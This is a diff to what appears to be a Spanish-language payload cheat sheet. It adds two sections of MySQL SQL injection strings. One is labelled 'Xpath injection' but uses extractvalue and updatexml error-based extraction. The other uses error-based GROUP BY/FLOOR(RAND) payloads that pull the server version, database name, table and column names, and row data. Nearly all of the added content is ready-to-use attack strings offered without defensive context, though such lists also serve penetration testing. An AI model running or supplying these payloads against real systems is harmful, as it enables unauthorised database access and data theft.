@@ -68,6 +68,8 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
     * [Sql inyection payload + comment + hex/unhex](#Sql-inyection-payload-+-comment-+-hex/unhex)
     * [Sql inyection payload + url encode](#Sql-inyection-payload-+-url-encode)
     * [MSSQL](#MSSQL)
+    * [Xpath injection](#Xpath injection)
+    * [Error based](#Error based)
         
         
    
@@ -1097,6 +1099,50 @@ union select culumn form table--
 
 ```
 
+## Xpath injection
+
+```
+
++and extractvalue(0x0a,concat(0x0a,(select version())))
+
++and updatexml(null,concat(0x0a,(select version())),null)
+
++and extractvalue(0x0a,concat(0x0a,(select database())))
+
++and updatexml(null,concat(0x0a,(select database())),null)
+
++and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))
+
++and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)
+
++and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=0x6e6f6d627265 limit 0,1)))
+
++and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=0x6e6f6d627265 limit 0,1)),null)
+
++and extractvalue(0x0a,concat(0x0a,(select concat(columna) from tabla limit 0,1)))
+
++and updatexml(null,concat(0x0a,(select concat(columna) from tabla limit 0,1)),null)
 
 
+```
 
+## Error based
+
+```
+Version:
++OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1
+
+Database():
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
+
+Tablas:
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x7461626c65+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
+
+Columnas:
++AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x636f6c756d6e61+AND+table_schema=0x7461626c65+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
+
+Extraer información:
++AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(columna+AS+CHAR),0x7e))+FROM+table+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
+
+
+```
